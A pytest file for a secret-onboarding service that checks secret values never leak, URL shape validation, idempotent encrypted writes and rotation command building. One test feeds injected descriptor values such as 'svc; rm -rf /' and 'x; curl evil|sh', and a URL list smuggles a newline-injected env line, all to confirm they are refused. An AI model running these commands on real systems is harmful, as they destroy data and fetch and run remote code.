"""service/secrets.py — guided secret-onboarding (the D headline). The security-critical properties are
asserted as data: secret VALUES never appear in the client-safe `view` or the apply result (only field NAMES
+ source); a required field with no value/generator/existing is a clean error; `generate:` mints on the box;
apply re-encrypts the WHOLE domain via the gitio sops seam (mocked — no real sops/age) and is idempotent.

Why each guards a real failure: a secret leaking into a response/log is the crown-jewel break this feature
exists to prevent; a silent missing-required would write a half-configured domain; a non-idempotent apply
would churn the canonical (a redundant proposal) on every re-save.
"""
import os
from types import SimpleNamespace

import pytest

from kontroll import catalog, gitio, paths
from kontroll.service import secrets as secrets_service

pytestmark = pytest.mark.unit


def test_registry_loads_the_service_domains():
    """load_secret_forms() returns the dropped-in service-domain descriptors, sorted by order — the registry
    is the loader, never a hardcoded list (guards a god-map regression)."""
    domains = catalog.registered_secret_forms()
    assert {"dashboards", "semaphore", "snmp_observability", "acme"} <= set(domains)
    # device-credential domains are NOT wizarded here (per-host via the device-onboard form)
    assert "network" not in domains and "proxmox" not in domains


def test_offerable_fields_unset_domain(monkeypatch):
    """offerable_fields reports each descriptor field's type/required + `already_set` from the domain's key
    NAMES — never a value. For a domain with no file (acme), nothing is already_set."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    out = secrets_service.offerable_fields("acme")
    assert out["error"] is None and out["domain"] == "acme"
    f = out["fields"][0]
    assert f["key"] == "acme_dns_token" and f["type"] == "token" and f["already_set"] is False


def test_offerable_fields_unknown_domain():
    """An unregistered domain is a clean no_form signal (the route maps it to 404), never a crash."""
    assert secrets_service.offerable_fields("not_a_domain")["error"] == "no_form"


def test_build_plan_provided_and_generated_never_leak(monkeypatch):
    """A provided value + a `generate: hex32` field both land in `to_set` (consumed by apply), but the
    client-safe `view` carries only NAMES + source — NEITHER the provided value NOR the generated token
    appears in the view. This is the no-leak crown-jewel, asserted on the plan a route would return."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    plan = secrets_service.build_secret_plan(
        "dashboards", {"grafana_admin_password": "s3cret-pw", "gui_admin_password": "gui-pw"})
    assert plan["error"] is None
    assert plan["to_set"]["grafana_admin_password"] == "s3cret-pw"
    assert len(plan["to_set"]["kontroll_api_token"]) == 64          # hex32 minted on the box
    sources = {v["key"]: v["source"] for v in plan["view"]}
    assert sources["grafana_admin_password"] == "provided" and sources["kontroll_api_token"] == "generated"
    blob = repr(plan["view"])                                       # the ONLY thing a route returns
    assert "s3cret-pw" not in blob and plan["to_set"]["kontroll_api_token"] not in blob


def test_build_plan_missing_required_is_error(monkeypatch):
    """A required field with no value, no generator, and not already set is a clean `missing:<key>` error —
    never a silent half-write of the domain."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    assert secrets_service.build_secret_plan("acme", {})["error"] == "missing:acme_dns_token"


_PWS = {"grafana_admin_password": "pw", "gui_admin_password": "pw"}     # the dashboards domain's required two
# Values the http_url shape refuses: one docker/.env's quotes, Vector's redaction of Grafana's failed-delivery line
# or an unquoted line could not carry, or not one http(s) URL (T32, S1).
_BAD_URLS = ["https://192.0.2.10/a b", "https://192.0.2.10/a$b", "https://192.0.2.10/a${b}", "https://192.0.2.10/#x",
             'https://192.0.2.10/"x', "https://192.0.2.10/'x", "https://192.0.2.10/a\\b",
             "https://192.0.2.10/x\nKONTROLL_X=1", "https://192.0.2.10/x\t",
             "https://192.0.2.10/x\x00", " https://192.0.2.10/x", "ftp://192.0.2.10/x", "https://",
             "192.0.2.10/x"]


def test_every_shape_a_descriptor_names_is_one_the_plan_knows():
    """Every `shape:` a secret-forms descriptor declares is in the closed set `secrets._SHAPES`, and the notifier
    URL declares `http_url`. Why: a misspelt shape would refuse every value the dialog sends (fail closed, but a
    form nobody can save), and a notifier URL with no shape would be stored however docker/.env would mangle it."""
    shapes = {(form["domain"], f["key"]): f["shape"] for form in catalog.load_secret_forms()
              for f in form.get("fields", []) if "shape" in f}
    assert shapes.get(("dashboards", "alert_notifier_url")) == "http_url"
    for where, shape in shapes.items():
        assert shape in secrets_service._SHAPES, "%s.%s: shape %r is not one the plan knows" % (where + (shape,))


@pytest.mark.parametrize("value", _BAD_URLS + [42, ["https://192.0.2.10/x"]])
def test_build_plan_refuses_a_value_its_shape_refuses(monkeypatch, value):
    """A provided notifier URL its field's `http_url` shape refuses is `bad_value:<key>` with the rule's words as
    the hint, and the plan carries nothing to encrypt and never the value. Why: docker/.env carries the URL into
    Grafana's environment single-quoted, where a `'` ends the quote (and a line compose cannot parse, it prints in an
    un-no_logged task's error); a space, a quote, a backslash or a character Go escapes would stop Vector's redaction
    of Grafana's failed-delivery line mid-path; a `$` or a `#` would change the line were it unquoted; and a value
    that is not one http(s) URL (another scheme, no host, not a string) is no notifier URL at all (T32 read B, S1;
    fold 2 read A, N1)."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    plan = secrets_service.build_secret_plan("dashboards", dict(_PWS, alert_notifier_url=value))
    assert plan == {"error": "bad_value:alert_notifier_url", "hint": secrets_service._SHAPES["http_url"][1]}
    assert "whitespace" in plan["hint"] and "$" in plan["hint"]


@pytest.mark.parametrize("value", ["https://ntfy.example/kontroll-x7q", "http://192.0.2.10:8080/hook?a=1&tok=x%20y"])
def test_build_plan_takes_a_url_its_shape_takes(monkeypatch, value):
    """A notifier URL in the shape (one http(s) URL, a query and a percent escape included) is provided as sent.
    Why: the shape check must not refuse the URLs ntfy and a webhook relay hand out."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    plan = secrets_service.build_secret_plan("dashboards", dict(_PWS, alert_notifier_url=value))
    assert plan["error"] is None and plan["to_set"]["alert_notifier_url"] == value


def test_build_plan_refuses_every_value_of_an_unknown_shape(monkeypatch):
    """A field whose `shape:` the plan does not know refuses every provided value, and a blank one is still
    skipped. Why: the shape set is closed; a typo must fail closed rather than store a value unchecked."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    monkeypatch.setattr(catalog, "secret_form", lambda d: {"domain": d, "fields": [{"key": "u", "shape": "htp_url"}]})
    plan = secrets_service.build_secret_plan("x", {"u": "https://192.0.2.10/x"})
    assert plan["error"] == "bad_value:u" and "htp_url" in plan["hint"]
    blank = secrets_service.build_secret_plan("x", {"u": ""})
    assert blank["error"] is None and blank["view"] == [{"key": "u", "label": "u", "source": "skipped"}]


@pytest.mark.parametrize("value", [42, True, ["https://192.0.2.10/x"], {"u": "https://192.0.2.10/x"}])
def test_build_plan_refuses_a_value_that_is_not_a_string_for_any_shape(monkeypatch, value):
    """A shaped field refuses a provided value that is not a string (a number, a bool, a list, a mapping) before its
    shape's rule is asked, so a shape whose rule takes anything still stores only a string, and a string it takes is
    stored. Why: the dialog's JSON can send any type, and `http_url`'s own rule held the type check alone; a second
    shape whose rule left it out would hand SOPS a list or a mapping (T32 fold 1 read B, N3)."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    monkeypatch.setitem(secrets_service._SHAPES, "anything", (lambda v: True, "any value"))
    monkeypatch.setattr(catalog, "secret_form", lambda d: {"domain": d, "fields": [{"key": "u", "shape": "anything"}]})
    assert secrets_service.build_secret_plan("x", {"u": value}) == {"error": "bad_value:u", "hint": "any value"}
    taken = secrets_service.build_secret_plan("x", {"u": "x"})
    assert taken["error"] is None and taken["to_set"] == {"u": "x"}


def test_build_plan_keeps_already_set(monkeypatch):
    """A required field left blank but ALREADY set in the domain is kept (source already_set), not re-written
    — re-saving a form without re-typing a password doesn't blank it."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: {"acme_dns_token"})
    plan = secrets_service.build_secret_plan("acme", {})
    assert plan["error"] is None and plan["to_set"] == {}
    assert plan["view"][0]["source"] == "already_set"


def test_apply_merges_and_writes_whole_domain(monkeypatch):
    """apply decrypts the existing domain, merges the new keys, and re-encrypts the WHOLE mapping via
    gitio.sops_write_domain (the stdin/whole-file seam). The values reach sops (expected — they ARE the
    secret) but only via that seam, never a return value or a print arg."""
    monkeypatch.setattr(gitio, "sops_decrypt_domain", lambda d: {"grafana_admin_password": "old"})
    captured = {}
    monkeypatch.setattr(gitio, "sops_write_domain", lambda d, m: captured.update({"domain": d, "map": dict(m)}) or True)
    plan = {"domain": "dashboards", "path": "instance/secrets/dashboards.sops.yml",
            "to_set": {"kontroll_api_token": "tok123"}}
    out = secrets_service.apply_secret_plan(plan)
    assert out["changed"] is True and out["error"] is None
    assert captured["map"] == {"grafana_admin_password": "old", "kontroll_api_token": "tok123"}
    assert out["paths"] == ["instance/secrets/dashboards.sops.yml"]


def test_apply_idempotent_no_rewrite(monkeypatch):
    """Re-applying values already present re-encrypts NOTHING (changed=False) — identical plaintext means no
    canonical churn / no redundant proposal, even though sops would mint fresh ciphertext."""
    monkeypatch.setattr(gitio, "sops_decrypt_domain", lambda d: {"acme_dns_token": "tok"})
    monkeypatch.setattr(gitio, "sops_write_domain", lambda d, m: (_ for _ in ()).throw(AssertionError("must not write")))
    out = secrets_service.apply_secret_plan(
        {"domain": "acme", "path": "instance/secrets/acme.sops.yml", "to_set": {"acme_dns_token": "tok"}})
    assert out["changed"] is False and out["error"] is None


def test_apply_decrypt_failure_is_clean_error(monkeypatch):
    """If the domain can't be decrypted (no/invalid age key), apply returns decrypt_failed and writes
    nothing — a missing key surfaces as a clean error, never a clobbered/empty domain."""
    monkeypatch.setattr(gitio, "sops_decrypt_domain", lambda d: None)
    out = secrets_service.apply_secret_plan(
        {"domain": "dashboards", "path": "instance/secrets/dashboards.sops.yml", "to_set": {"x": "y"}})
    assert out["changed"] is False and out["error"] == "decrypt_failed"


def test_generated_values_have_the_right_shape():
    """hex32 -> 64 hex chars; base64_32 -> decodes to 32 bytes. Guards a weak/short generated secret."""
    import base64
    assert len(secrets_service._GENERATORS["hex32"]()) == 64
    assert len(base64.b64decode(secrets_service._GENERATORS["base64_32"]())) == 32


# --- rotation (PR-1): the overwrite gate + the actuation hand-off ------------------------------------------

def test_offerable_fields_surfaces_rotatable(monkeypatch):
    """offerable_fields marks each field `rotatable` from the descriptor (NAMES/flags only) so the dialog knows
    which logins offer rotation. dashboards gui_admin_password/kontroll_api_token are rotatable; the semaphore
    DB password + access-key are TRAPS and are NOT — guards a regression that exposes a destructive field to the
    rotate UX (rotating either alone breaks the running service)."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    dash = {f["key"]: f for f in secrets_service.offerable_fields("dashboards")["fields"]}
    assert dash["gui_admin_password"]["rotatable"] is True and dash["kontroll_api_token"]["rotatable"] is True
    sem = {f["key"]: f for f in secrets_service.offerable_fields("semaphore")["fields"]}
    assert sem["semaphore_admin_password"]["rotatable"] is True
    assert sem["semaphore_db_password"]["rotatable"] is False            # rotation trap — never offered
    assert sem["semaphore_access_key_encryption"]["rotatable"] is False


def test_overwrite_set_is_names_only_and_server_derived(monkeypatch):
    """overwrite_set = already-present ∩ being-written (provided|generated): NAMES only, re-derived from the
    domain file (`_existing_keys`), never a client assertion. A new value for an ALREADY-SET field is an
    overwrite; a fresh field is not. Guards the C9 measure-twice gate + the M1 server-is-the-guard rule, and
    that the value never appears (C11)."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: {"grafana_admin_password"})
    plan = secrets_service.build_secret_plan(
        "dashboards", {"grafana_admin_password": "new-pw", "gui_admin_password": "fresh-pw"})
    ow = secrets_service.overwrite_set("dashboards", plan)
    assert ow == ["grafana_admin_password"]                              # already_set AND rewritten
    assert "gui_admin_password" not in ow                                # fresh field — not an overwrite
    assert "new-pw" not in repr(ow) and "fresh-pw" not in repr(ow)       # NAMES only, never a value


def test_overwrite_set_empty_when_nothing_preexists(monkeypatch):
    """First-time onboarding (no field already set) overwrites nothing → the gate never fires for a fresh
    domain. Guards a false-positive that would force a confirm on initial secret entry."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    plan = secrets_service.build_secret_plan("dashboards", {"gui_admin_password": "pw"})
    assert secrets_service.overwrite_set("dashboards", plan) == []


def test_actuation_enact_recreate_and_grafana_cli():
    """actuation_enact_commands emits the right post-promote command per `actuation.kind`: a `recreate` field
    (gui_admin_password) → a deploy-stack recreate of its service + the self-evict consequence; a `grafana-cli`
    field → an in-container `docker exec`; the api token's recreate carries api_privileged. Mirrors
    observe.telemetry_enact_commands — the GUI runs none of these (hand-off only). The grafana cmd must use the
    Grafana-13 form `grafana cli ... --password-from-stdin` (the standalone `grafana-cli` binary was removed in
    G11+; the stdin flag keeps the value OFF argv) — guards a regression to the broken `grafana-cli` string."""
    enact = {e["field"]: e for e in secrets_service.actuation_enact_commands(
        "dashboards", ["gui_admin_password", "grafana_admin_password", "kontroll_api_token"])}
    assert "onboard-gui" in enact["gui_admin_password"]["cmd"] and "deploy-stack" in enact["gui_admin_password"]["cmd"]
    assert enact["gui_admin_password"]["consequence"] == "self-evict"
    gcmd = enact["grafana_admin_password"]["cmd"]
    assert gcmd.startswith("docker exec -i grafana")
    assert "grafana cli admin reset-admin-password" in gcmd      # G13 subcommand form…
    assert "grafana-cli" not in gcmd                             # …NOT the removed standalone binary
    assert "--password-from-stdin" in gcmd                       # value fed on stdin, never on argv
    assert "api_privileged=true" in enact["kontroll_api_token"]["cmd"]


def test_actuation_enact_skips_non_rotatable_fields():
    """A non-rotatable field emits NO enact even when set in the same plan as a rotatable one: semaphore_admin
    (username) + semaphore_db_password are rotation TRAPS (un-flagged), so only semaphore_admin_password (PR-2,
    actuated) yields a record. Guards against emitting an actuation for a field we deliberately don't actuate."""
    enact = secrets_service.actuation_enact_commands(
        "semaphore", ["semaphore_admin", "semaphore_admin_password", "semaphore_db_password"])
    assert [e["field"] for e in enact] == ["semaphore_admin_password"]


def test_actuation_enact_rotatable_without_actuation_is_stage_only(monkeypatch):
    """A field that is `rotatable:` but carries NO `actuation` block stays STAGE-ONLY — the value is recorded,
    nothing is emitted (a service can opt into rotation tracking before its enact lands, exactly as
    semaphore_admin_password did in PR-1). Guards the 'rotatable ⇏ actuated' gap so a missing block fails safe
    rather than emitting a bogus command."""
    form = {"domain": "x", "fields": [{"key": "p", "rotatable": True}]}   # rotatable, no actuation
    monkeypatch.setattr(catalog, "secret_form", lambda d: form)
    assert secrets_service.actuation_enact_commands("x", ["p"]) == []


def test_actuation_enact_semaphore_admin_recreate_then_login_upsert():
    """semaphore_admin_password emits the `semaphore-admin` two-step enact (PR-2): step 1 recreates `semaphore`
    (re-render .env so the promoted value lands in the container env), step 2 an in-container
    `users change-by-login` that reads login+password from the container's OWN env (`$SEMAPHORE_ADMIN` /
    `$SEMAPHORE_ADMIN_PASSWORD`) — never a literal value. Guards the live-rotation contract: recreate-ALONE
    cannot rotate an existing admin (Semaphore sets it only at first-run setup), and the value must never reach
    the host argv or shell history. Verified live on Semaphore v2.18.12."""
    rec = {e["field"]: e for e in secrets_service.actuation_enact_commands(
        "semaphore", ["semaphore_admin_password"])}["semaphore_admin_password"]
    cmd = rec["cmd"]
    # step 1: a deploy-stack recreate of the semaphore service
    assert "deploy-stack.yml" in cmd and '"stack_services":["semaphore"]' in cmd
    # step 2: the in-container CLI upsert, ferrying login+password by ENV NAME (not a literal value)
    assert "docker exec semaphore sh -c" in cmd
    assert "semaphore users change-by-login" in cmd
    assert '--login "$SEMAPHORE_ADMIN"' in cmd and '--password "$SEMAPHORE_ADMIN_PASSWORD"' in cmd
    assert "--config /etc/semaphore/config.json" in cmd
    # the value never appears; the record carries only the contract keys; recreate is called out as a consequence
    assert set(rec) == {"field", "kind", "cmd", "why", "consequence"}
    assert "recreates semaphore" in rec["consequence"]
    assert rec["kind"] == "operator"   # the GUI/API run none of it — operator hand-off (mirrors grafana-cli)


def test_actuation_enact_never_embeds_a_value():
    """The builder takes field NAMES only and the descriptor `actuation:` block carries no secret, so no emitted
    record can contain a value — the structural guarantee behind the C11 'enact carries no value' contract. The
    record keys are exactly {field, kind, cmd, why, consequence} (no value/secret key)."""
    rec = secrets_service.actuation_enact_commands("dashboards", ["gui_admin_password"])[0]
    assert set(rec) == {"field", "kind", "cmd", "why", "consequence"}
    assert rec["field"] == "gui_admin_password"


def test_actuation_kind_is_a_validated_closed_enum():
    """Every `actuation.kind` declared in ANY secret-forms/*.yml is in the closed enum, and the interpolated
    `service:`/`exec:` carry no shell metachars — so the 'closed enum' promise (README/SECURITY/the docstring)
    is a VALIDATED fact, not a convention a typo can slip past. Guards descriptor injection (SEC-1) + a silent
    typo'd kind degrading to stage-only (C-8). Registry-driven, so a new descriptor is covered automatically."""
    for form in catalog.load_secret_forms():
        for f in form.get("fields", []):
            act = f.get("actuation")
            if not act:
                continue
            assert act.get("kind") in secrets_service._ACTUATION_KINDS, \
                "%s.%s: actuation.kind %r not in the closed enum" % (form["domain"], f["key"], act.get("kind"))
            if act.get("service") is not None:
                assert secrets_service._SAFE_SERVICE.match(act["service"]), \
                    "%s.%s: actuation.service %r has unsafe chars" % (form["domain"], f["key"], act["service"])
            if act.get("exec") is not None:
                assert secrets_service._SAFE_EXEC.match(act["exec"]), \
                    "%s.%s: actuation.exec %r has unsafe chars" % (form["domain"], f["key"], act["exec"])


def test_actuation_enact_rejects_unknown_kind_and_metachar_injection(monkeypatch):
    """Runtime defense-in-depth: a poisoned/typo'd descriptor can never emit a shell-metachar (or wrong) command
    — an unknown `kind`, a `service` with metachars, and an `exec` with metachars each emit NOTHING (fail-safe).
    Behind the descriptor schema pin; guards the SEC-1 command-injection vector at the builder too."""
    bad = {"domain": "x", "fields": [
        {"key": "a", "rotatable": True, "actuation": {"kind": "recreatte", "service": "onboard-gui"}},
        {"key": "b", "rotatable": True, "actuation": {"kind": "recreate", "service": "svc; rm -rf /"}},
        {"key": "c", "rotatable": True, "actuation": {"kind": "grafana-cli", "service": "grafana",
                                                      "exec": "x; curl evil|sh"}},
    ]}
    monkeypatch.setattr(catalog, "secret_form", lambda d: bad)
    assert secrets_service.actuation_enact_commands("x", ["a", "b", "c"]) == []


def test_secrets_pure_fns_are_read_only():
    """overwrite_set + actuation_enact_commands must stay PURE (no write verb) — the AST pin stops a future edit
    slipping a docker exec / subprocess / file write into the 'the GUI/API never actuate' functions (C-9)."""
    from _readonly_pins import assert_read_only
    assert_read_only("scripts/kontroll/service/secrets.py", "overwrite_set")
    assert_read_only("scripts/kontroll/service/secrets.py", "actuation_enact_commands")


def test_blank_already_set_generated_field_is_kept_unless_regenerate_requested(monkeypatch):
    """The #141 footgun FIX (deliberately FLIPS the prior pinned behavior — C-7/SEC-2): a blank `generate:`
    field that is ALREADY SET (kontroll_api_token) is KEPT on a normal save, so rotating gui_admin_password no
    longer silently re-mints (and self-invalidates) the privileged API token. It re-mints ONLY when the caller
    EXPLICITLY lists it in `regenerate` (the GUI 'gen' button). Guards the silent-rotation/self-lockout."""
    monkeypatch.setattr(secrets_service, "_existing_keys",
                        lambda d: {"gui_admin_password", "grafana_admin_password", "kontroll_api_token"})
    # rotate ONLY gui_admin_password: the blank already-set token is KEPT (not in to_set, not an overwrite)
    plan = secrets_service.build_secret_plan("dashboards", {"gui_admin_password": "x"})
    assert "kontroll_api_token" not in plan["to_set"]
    assert next(v["source"] for v in plan["view"] if v["key"] == "kontroll_api_token") == "already_set"
    assert secrets_service.overwrite_set("dashboards", plan) == ["gui_admin_password"]   # ONLY the rotated field
    # EXPLICIT regenerate (the 'gen' button): the token re-mints (64 hex) + is flagged as an overwrite
    plan2 = secrets_service.build_secret_plan("dashboards", {"gui_admin_password": "x"},
                                              regenerate=["kontroll_api_token"])
    assert len(plan2["to_set"]["kontroll_api_token"]) == 64
    assert "kontroll_api_token" in secrets_service.overwrite_set("dashboards", plan2)


def test_first_time_generated_field_is_minted_without_regenerate(monkeypatch):
    """A `generate:` field that is ABSENT (first-time onboarding) is still minted on a blank save WITHOUT any
    `regenerate` signal — the fix changes ONLY already-set fields. Guards a regression that would leave a fresh
    node's API token unset (kontroll-init + the first GUI onboard rely on absent -> mint)."""
    monkeypatch.setattr(secrets_service, "_existing_keys", lambda d: set())
    plan = secrets_service.build_secret_plan("dashboards", {"gui_admin_password": "x", "grafana_admin_password": "y"})
    assert len(plan["to_set"]["kontroll_api_token"]) == 64   # absent -> minted (first-time), no regen needed


def test_sops_write_domain_creates_missing_overlay_secrets_dir(tmp_path, monkeypatch):
    """F3 (live dogfood): gitio.sops_write_domain must create the overlay's secrets/ dir if absent. On a
    BRAND-NEW node the scaffold deliberately skips secrets/, so the first domain write (kontroll-init's dashboards
    bootstrap) FileNotFoundError'd on the missing parent dir — exactly what the blind install hit. Mocks the sops
    encrypt subprocess (no real binary) and points ROOT at an overlay tree whose secrets/ dir does not yet exist."""
    monkeypatch.setattr(paths, "ROOT", str(tmp_path))
    os.makedirs(tmp_path / "instance")                      # overlay ACTIVE, but its secrets/ subdir is absent
    monkeypatch.setattr("subprocess.run",
                        lambda *a, **k: SimpleNamespace(returncode=0, stdout=b"--- ciphertext ---\n"))
    assert gitio.sops_write_domain("dashboards", {"k": "v"}) is True
    assert (tmp_path / "instance" / "secrets" / "dashboards.sops.yml").exists()   # dir created + file written
